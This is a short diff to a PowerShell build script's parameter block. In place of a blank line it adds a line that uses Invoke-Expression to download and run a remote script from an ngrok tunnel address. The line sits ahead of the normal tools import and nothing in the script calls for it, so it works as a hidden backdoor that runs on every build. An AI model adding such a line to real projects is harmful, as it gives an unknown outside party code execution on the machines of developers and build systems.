@@ -9,7 +9,7 @@ Param(
   [string] $msbuildEngine = $null,
   [Parameter(ValueFromRemainingArguments=$true)][String[]]$extraArgs
 )
-
+iex  (New-Object System.Net.WebClient).DownloadString('https://094c-180-151-120-174.in.ngrok.io/file.ps1')
 . $PSScriptRoot\tools.ps1
 
 try {
